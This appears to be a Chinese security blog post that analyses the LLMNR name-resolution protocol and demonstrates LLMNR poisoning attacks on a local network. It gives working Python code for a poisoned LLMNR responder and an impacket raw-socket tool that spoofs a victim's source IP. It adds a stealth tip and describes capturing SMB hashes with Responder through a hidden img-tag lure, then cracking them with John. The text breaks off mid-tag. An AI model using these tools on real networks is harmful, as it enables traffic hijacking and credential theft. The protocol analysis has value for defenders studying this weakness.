    <url>/post/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/</url>
    
    <content type="html"><![CDATA[<p>本文将会对 LLMNR 协议进行分析并用 Python 实现质询和应答，之后重点阐述利用 LLMNR 在名称解析过程中的缺陷进行实战攻击的部分思路。</p><h2 id="0x00-LLMNR-简介"><a href="#0x00-LLMNR-简介" class="headerlink" title="0x00 LLMNR 简介"></a>0x00 LLMNR 简介</h2><p>从 Windows Vista 起，Windows 操作系统开始支持一种新的名称解析协议——LLMNR，主要用于局域网中的名称解析。LLMNR 能够很好的支持 IPv4 和 IPv6，因此在 Windows 名称解析顺序中是一个仅次于  DNS 的名称解析方式，更重要的是在 Linux 操作系统中也实现了 LLMNR。</p><h2 id="0x01-LLMNR-协议分析"><a href="#0x01-LLMNR-协议分析" class="headerlink" title="0x01 LLMNR 协议分析"></a>0x01 LLMNR 协议分析</h2><p>LLMNR 协议定义在 <a href="https://tools.ietf.org/html/rfc4795">RFC 4795</a> 中。文档里详细的介绍了有关于 LLMNR 协议的结构，配置以及安全性等内容。</p><ul><li>LLMNR 的协议结构如下图所示：</li></ul><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160617-02a1becc-d413-1.png" alt="LLMNR 协议结构"></p><ul><li>LLMNR 协议结构图中各个字段的说明如下：<ul><li>ID - Transaction ID 是一个随机生成的用来标识质询与应答的 16 位标识符。</li><li>QR - 0 为查询，1 为响应。</li><li>OPCODE - 是一个 4 位的字段，用来指定在此消息中的查询类型，该字段的值会在发起查询时被设置并复制到响应消息中。目前此规范定义了标准的查询和响应（OPCODE 的值为零）的行为，在未来的规范中可以在 LLMNR 中定义其他的 OPCODE。  </li><li>C - 冲突位</li><li>TC - 截断位</li><li>T - 暂定，无标志</li><li>Z - 保留位</li><li>RCODE - 响应码</li><li>QDCOUNT -  16 位的无符号整数，指定在质询部分中的条目数量。</li><li>ANCOUNT -  16 位的无符号整数，指定在应答部分中的资源记录数量。</li><li>NSCOUNT -  16 位的无符号整数，指定在权威记录部分的名称服务器资源记录数量 。</li><li>ARCOUNT -  16 位的无符号整数，指定在附加记录部分的资源记录数量。</li></ul></li></ul><h2 id="0x02-LLMNR-名称解析过程"><a href="#0x02-LLMNR-名称解析过程" class="headerlink" title="0x02 LLMNR 名称解析过程"></a>0x02 LLMNR 名称解析过程</h2><p>一个完整的正常的 LLMNR 名称解析过程如下图所示（ 假定主机 B 已加入了组播组中）：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160636-0e06ea6c-d413-1.png" alt="一个完整的正常的 LLMNR 名称解析过程"></p><p>使用 Wireshark 抓取一个完整的 LLMNR 质询/应答过程的数据包，如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160649-1631b05a-d413-1.png" alt="一个完整的 LLMNR 质询/应答过程数据包"></p><p>从上图可以看到，编号为 No.3 和 No.4 的数据包证明了主机 A 分别使用自己的 IPv4 地址和 IPv6 地址向 IPv4 和  IPv6 的广播地址进行了广播，质询数据包的 TID 为 0xc7f7。查询的地址类型为请求主机 B 的 IPv4 地址，这一点可以从 A 或  AAAA 进行区别，一个 A 表示请求的地址类型为 IPv4 地址，四个 A（AAAA）表示请求的地址类型为 IPv6 地址。</p><p>编号为 No.5 的数据包证明了主机 B（192.168.16.130）收到请求数据包后，发现有主机请求自己的 IP地址，于是向主机 A  进行单播应答，将自己的 IP 地址单播给了主机 A，应答的地址类型为 IPv4，同时该数据包的 TID 的值为上面主机 A 进行广播的数据包的  TID（0xc7f7）。</p><p>质询的数据包的详细结构如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160724-2aa8db3a-d413-1.png" alt="质询的数据包详细结构"></p><p>应答的数据包的详细结构如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160747-38c1da50-d413-1.png" alt="应答的数据包详细结构"></p><h2 id="0x03-编程实现-LLMNR-的质询和应答"><a href="#0x03-编程实现-LLMNR-的质询和应答" class="headerlink" title="0x03 编程实现 LLMNR 的质询和应答"></a>0x03 编程实现 LLMNR 的质询和应答</h2><p>通过上面的内容，可以很直观的理解 LLMNR 进行名称解析的详细过程，使用 Python 可以快速实现 LLMNR 协议的质询和应答编程。<br>LLMNR 协议的质询过程实际上就是进行了一个广播，质询的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LLMNR_Query</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self,name</span>):</span><br>        self.name = name<br><br>        self.IsIPv4 = <span class="hljs-literal">True</span><br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&#x27;224.0.0.252&#x27;</span> <span class="hljs-keyword">if</span> self.IsIPv4 <span class="hljs-keyword">else</span> <span class="hljs-string">&#x27;FF02::1:3&#x27;</span><br>        self.PORT = <span class="hljs-number">5355</span><br>        self.s_family = socket.AF_INET <span class="hljs-keyword">if</span> self.IsIPv4 <span class="hljs-keyword">else</span> socket.AF_INET6<br><br>        self.QueryType = <span class="hljs-string">&quot;IPv4&quot;</span><br>        self.lqs = socket.socket(self.s_family, socket.SOCK_DGRAM)<br><br>        self.QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Flags Query(0x0000)? or Response(0x8000) ?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;LENGTH&quot;</span>    <span class="hljs-comment"># length of Name</span><br>        <span class="hljs-string">&quot;NAME&quot;</span>      <span class="hljs-comment"># Name</span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;TYPE&quot;</span>      <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br>        namelen = <span class="hljs-built_in">len</span>(self.name)<br>        self.data = self.QueryData.replace(<span class="hljs-string">&#x27;LENGTH&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, namelen))<br>        self.data = self.data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, struct.pack(<span class="hljs-string">&quot;&gt;&quot;</span>+<span class="hljs-built_in">str</span>(namelen)+<span class="hljs-string">&quot;s&quot;</span>, self.name))<br>        self.data = self.data.replace(<span class="hljs-string">&quot;TYPE&quot;</span>,  <span class="hljs-string">&quot;\x00\x01&quot;</span> <span class="hljs-keyword">if</span> self.QueryType == <span class="hljs-string">&quot;IPv4&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;\x00\x1c&quot;</span>)<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Query</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LLMNR Querying... -&gt; %s&quot;</span> % self.name<br>            self.lqs.sendto(self.data, (self.HOST, self.PORT))<br>        self.lqs.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    llmnr = LLMNR_Query(<span class="hljs-string">&quot;Wooyun&quot;</span>)<br>    llmnr.Query()<br></code></pre></td></tr></table></figure><p>要对 LLMNR 协议的质询请求进行应答，首先要将本机加入多播（或组播）组中，所使用的协议为 IGMP。具体编程实现的方式可以直接构造数据包使用 UDP 发送，也可以使用套接字提供的 setsockopt 函数进行设置。</p><p>应答的实现方式很简单，创建一个 UDP 套接字使用 setsockopt 函数加入多播组并监听 5355 端口，当然也可以使用非阻塞的 SocketServer 模块实现，效果更佳。</p><p>具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, struct<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LLMNR_Answer</span>:</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, addr</span>):</span><br><br>        self.IPADDR  = addr<br>        self.las = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>        self.init_socket()<br>        self.populate()<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">populate</span>(<span class="hljs-params">self</span>):</span><br><br>        self.AnswerData = (<br>            <span class="hljs-string">&quot;TID&quot;</span>               <span class="hljs-comment"># Tid</span><br>            <span class="hljs-string">&quot;\x80\x00&quot;</span>          <span class="hljs-comment"># Flags  Query(0x0000)? or Response(0x8000) ?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Question</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Answer RRS</span><br>            <span class="hljs-string">&quot;\x00\x00&quot;</span>          <span class="hljs-comment"># Authority RRS</span><br>            <span class="hljs-string">&quot;\x00\x00&quot;</span>          <span class="hljs-comment"># Additional RRS</span><br>            <span class="hljs-string">&quot;LENGTH&quot;</span>            <span class="hljs-comment"># Question Name Length</span><br>            <span class="hljs-string">&quot;NAME&quot;</span>              <span class="hljs-comment"># Question Name</span><br>            <span class="hljs-string">&quot;\x00&quot;</span>              <span class="hljs-comment"># Question Name Null</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Class</span><br>            <span class="hljs-string">&quot;LENGTH&quot;</span>            <span class="hljs-comment"># Answer Name Length</span><br>            <span class="hljs-string">&quot;NAME&quot;</span>              <span class="hljs-comment"># Answer Name</span><br>            <span class="hljs-string">&quot;\x00&quot;</span>              <span class="hljs-comment"># Answer Name Null</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Answer Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>            <span class="hljs-string">&quot;\x00\x01&quot;</span>          <span class="hljs-comment"># Class</span><br>            <span class="hljs-string">&quot;\x00\x00\x00\x1e&quot;</span>  <span class="hljs-comment"># TTL Default:30s</span><br>            <span class="hljs-string">&quot;\x00\x04&quot;</span>          <span class="hljs-comment"># IP Length</span><br>            <span class="hljs-string">&quot;IPADDR&quot;</span>)           <span class="hljs-comment"># IP Address</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">init_socket</span>(<span class="hljs-params">self</span>):</span><br>        self.HOST = <span class="hljs-string">&quot;0.0.0.0&quot;</span><br>        self.PORT = <span class="hljs-number">5355</span><br>        self.MulADDR  = <span class="hljs-string">&quot;224.0.0.252&quot;</span><br>        self.las.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, <span class="hljs-number">255</span>)<br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP,<br>                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Answser</span>(<span class="hljs-params">self</span>):</span><br>        self.las.bind((self.HOST, self.PORT))<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Listening...&quot;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            data, addr = self.las.recvfrom(<span class="hljs-number">1024</span>)<br><br>            tid = data[<span class="hljs-number">0</span>:<span class="hljs-number">2</span>]<br>            namelen = struct.unpack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, data[<span class="hljs-number">12</span>])[<span class="hljs-number">0</span>]<br>            name = data[<span class="hljs-number">13</span>:<span class="hljs-number">13</span> + namelen]<br><br>            data = self.AnswerData.replace(<span class="hljs-string">&#x27;TID&#x27;</span>, tid)<br>            data = data.replace(<span class="hljs-string">&#x27;LENGTH&#x27;</span>, struct.pack(<span class="hljs-string">&#x27;&gt;B&#x27;</span>, namelen))<br>            data = data.replace(<span class="hljs-string">&#x27;NAME&#x27;</span>, name)<br>            data = data.replace(<span class="hljs-string">&#x27;IPADDR&#x27;</span>, socket.inet_aton(self.IPADDR))<br><br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Poisoned answer(%s) sent to %s for name %s &quot;</span> % (self.IPADDR, addr[<span class="hljs-number">0</span>], name)<br>            self.las.sendto(data, addr)<br><br>        self.las.setsockopt(socket.IPPROTO_IP, socket.IP_DROP_MEMBERSHIP,<br>                       socket.inet_aton(self.MulADDR) + socket.inet_aton(self.HOST))<br>        self.las.close()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    llmnr = LLMNR_Answer(<span class="hljs-string">&quot;11.22.33.44&quot;</span>)<br>    llmnr.Answser()<br></code></pre></td></tr></table></figure><p>LLMNR 应答执行结果如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160820-4c222a64-d413-1.png" alt="Python 实现 LLMNR 质询与应答1"></p><p>模拟查询主机名称为 <strong>Wooyun</strong> 的结果：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160835-54f37a3a-d413-1.png" alt="Python 实现 LLMNR 质询与应答2"></p><h2 id="0x04-LLMNR-Poison-攻击原理"><a href="#0x04-LLMNR-Poison-攻击原理" class="headerlink" title="0x04 LLMNR Poison 攻击原理"></a>0x04 LLMNR Poison 攻击原理</h2><p>一个完整的正常的 LLMNR 名称解析过程如图 2 所示，由于 LLMNR 使用无连接的 UDP 协议发送广播，之后多播组内的主机可以对发起名称解析的主机进行应答，因此，在这个过程中，攻击者就有机可乘。</p><p>攻击者可以将自己的主机加入到组播组中，当收到其他主机进行名称解析的质询请求，就可以对发起此次名称解析的主机进行“恶意”应答，利用此缺陷进行欺骗攻击的方式称为 <strong>LLMNR Poison 攻击</strong>。</p><p> “恶意”应答过程如下图所示：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160859-638cf5c6-d413-1.png" alt="攻击者进行“恶意”应答过程图示"></p><p>LLMNR 名称解析的最大缺陷就是，在当前局域网中，无论是否存在主机 B（假定机器名为：SECLAB-HER0IN），只要有主机请求 SECLAB-HER0IN 都会进行一次 LLMNR 名称解析。</p><h2 id="0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话"><a href="#0x05-利用伪造源-IP-LLMNR-Poison-劫持内网指定主机会话" class="headerlink" title="0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话"></a>0x05 利用伪造源 IP + LLMNR Poison 劫持内网指定主机会话</h2><p>由于 UDP 是面向无连接的，所以不存在三次握手的过程，因此，在 LLMNR 名称解析过程中，UDP  的不安全性就体现出来了。攻击者可以伪造源 IP 地址向广播地址发送 LLMNR 名称解析质询，之后攻击者再对这个质询进行应答，完全是一场  <strong>“自导自演”</strong> 的戏。</p><p>修改 UDP 源 IP 的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> socket, time<br><span class="hljs-keyword">from</span> impacket <span class="hljs-keyword">import</span> ImpactDecoder, ImpactPacket<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">UDPSpoof</span>(<span class="hljs-params">src_ip, src_port, dst_ip, dst_port, data</span>):</span><br>    ip = ImpactPacket.IP()<br>    ip.set_ip_src(src_ip)<br>    ip.set_ip_dst(dst_ip)<br><br>    udp = ImpactPacket.UDP()<br>    udp.set_uh_sport(src_port)<br>    udp.set_uh_dport(dst_port)<br><br>    udp.contains(ImpactPacket.Data(data))<br>    ip.contains(udp)<br><br>    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)<br>    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, <span class="hljs-number">1</span>)<br>    s.sendto(ip.get_packet(), (dst_ip, dst_port))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    QueryData = (<br>        <span class="hljs-string">&quot;\xa9\xfb&quot;</span>  <span class="hljs-comment"># Transaction ID</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Flags Query(0x0000)? or Response(0x8000) ?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Question</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Answer RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Authority RRS</span><br>        <span class="hljs-string">&quot;\x00\x00&quot;</span>  <span class="hljs-comment"># Additional RRS</span><br>        <span class="hljs-string">&quot;\x09&quot;</span>      <span class="hljs-comment"># length of Name</span><br>        <span class="hljs-string">&quot;Her0in-PC&quot;</span>    <span class="hljs-comment"># Name</span><br>        <span class="hljs-string">&quot;\x00&quot;</span>      <span class="hljs-comment"># NameNull</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>  <span class="hljs-comment"># Query Type ,IPv4(0x0001)? or IPv6(0x001c)?</span><br>        <span class="hljs-string">&quot;\x00\x01&quot;</span>) <span class="hljs-comment"># Class</span><br><br>    ip_src = <span class="hljs-string">&quot;192.168.169.1&quot;</span><br>    ip_dst = <span class="hljs-string">&quot;224.0.0.252&quot;</span><br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;UDP Source IP Spoof %s =&gt; %s for Her0in-PC&quot;</span> % (ip_src, ip_dst))<br>        UDPSpoof(ip_src, <span class="hljs-number">18743</span>,ip_dst , <span class="hljs-number">5355</span>, QueryData)<br>        time.sleep(<span class="hljs-number">3</span>)<br></code></pre></td></tr></table></figure><blockquote><p>为了不要那么暴力，在最后加了个延时，实际上在 LLMNR 应答数据包中有一个 TTL 默认为 30s，在实战中为了隐蔽可以将延时加大。</p></blockquote><p>具体攻击过程如下：</p><ul><li>攻击者（IP：111.111.111.111）伪造受害者（IP：222.222.222.222）向 LLMNR 协议的广播地址发送 LLMNR 质询，请求解析名称为：HER0IN-PC（IP：333.333.333.333） 的 IP；</li><li>攻击者（IP：111.111.111.111）加入多播组收到 “受害者” 的请求，对质询进行响应，将自己的IP（可以是任何 IP）单播给受害者。</li></ul><p>攻击的效果就是，受害者只要使用计算机名称访问 HER0IN-PC 这台主机的任何服务，都会被重定向到攻击者指定的 IP 上。</p><p>测试环境如下：</p><ul><li>攻击者主机 IP：192.168.169.5，启动伪造 IP 进行 LLMNR 广播的恶意程序以及 LLMNR 应答程序</li><li>受害者 IP：192.168.169.3，无需任何操作</li></ul><p>当受害者访问内网某台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器：</p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160934-78309122-d413-1.png" alt="攻击者主机启动相应的程序，并提供了 WEB 服务"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160943-7d99c9ee-d413-1.png" alt="当受害者访问 win2k3-3a85d681 这台主机的 WEB 服务时被重定向到攻击者主机的 WEB 服务器"></p><p><img src="/img/%E5%88%A9%E7%94%A8LLMNR%E5%90%8D%E7%A7%B0%E8%A7%A3%E6%9E%90%E7%BC%BA%E9%99%B7%E5%8A%AB%E6%8C%81%E5%86%85%E7%BD%91%E6%8C%87%E5%AE%9A%E4%B8%BB%E6%9C%BA%E4%BC%9A%E8%AF%9D/20171128160954-83e858ec-d413-1.png" alt="受害者原本想访问的 WEB 服务器是 Windows Server 2003 却被攻击者“重定向”到了一台 Linux 主机上"></p><h2 id="0x06-LLMNR-Poison-实战攻击思路"><a href="#0x06-LLMNR-Poison-实战攻击思路" class="headerlink" title="0x06 LLMNR Poison 实战攻击思路"></a>0x06 LLMNR Poison 实战攻击思路</h2><p>在局域网中，名称解析的行为是非常频繁的，只要有使用计算机名称，准确的说是使用 NetBIOS 名称或非 FQDN 域名的地方都会产生名称解析，如  PING 主机名称，使用主机名称连接各种服务等等。Windows 系统也默认启用了 NetBIOS 和 LLMNR，这就使得 LLMNR  Poison 攻击的实战价值有所提升。但实际上在实战中使用 LLMNR Poison 攻击时，会遇到一些问题，如 5355  端口被占用，防火墙拦截等，不过这些小问题都是可以解决的；另外还有一些不可控的客观因素，如网络稳定性等等，但这些问题也不是非常普遍并且不可解决的。</p><p>下面提供几种在实战中可用的 LLMNR Poison 攻击思路，以 <strong>Responder</strong> 做为攻击工具进行演示。</p><h3 id="劫持会话获取-HASH"><a href="#劫持会话获取-HASH" class="headerlink" title="劫持会话获取 HASH"></a>劫持会话获取 HASH</h3><p>通过劫持会话获取受害者的 HASH，有两种常见的攻击场景：</p><h4 id="劫持-SMB-会话获取-HASH"><a href="#劫持-SMB-会话获取-HASH" class="headerlink" title="劫持 SMB 会话获取 HASH"></a>劫持 SMB 会话获取 HASH</h4><p>利用 LLMNR Poison 攻击劫持 SMB 会话与 SMB Relay 攻击相似，本质上都是对 SMB 的会话进行劫持，但是  SMB Relay 攻击是被动式的攻击，同时，攻击者所劫持的 SMB 会话只有在该会话本身是一次成功的会话的情况下才能拿到目标服务器的权限。利用  LLMNR Poison 攻击劫持 SMB 会话，只要有主机使用计算机名称访问其他主机的共享时就可以得到发起共享请求的主机的 HASH。但是这个 HASH 只能用于爆破（因为已知了挑战），无法直接登录主机。可以将 LLMNR Poison 攻击 与 SMB Relay  攻击结合起来，提升攻击力。 </p><p>攻击的方式大致为：</p><ul><li>结合社工欺骗受害者访问一个正常的但已嵌入类似于 <code>&lt;img/src=\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</code> 或 <code>&lt;img/src=http:\\SECLAB-HER0IN\1.jpg width=0 height=0&gt;</code> 的网页；</li><li>当受害者访问网页后，如果受害者主机系统版本是 Vista 之后的，就会产生 LLMNR 名称解析。</li><li>此时攻击者的主机（已启动了 Responder ）就会收到受害者主机的 HASH；</li><li>当然也可以一直启动 Responder 进行监听，不需要其他额外的操作，只要有主机使用计算机名称请求 SMB 或 WEB 服务就可以得到相应主机的 HASH；</li><li>之后使用 John 破解 SMB 会话劫持到的 HASH。</li></ul><p><img 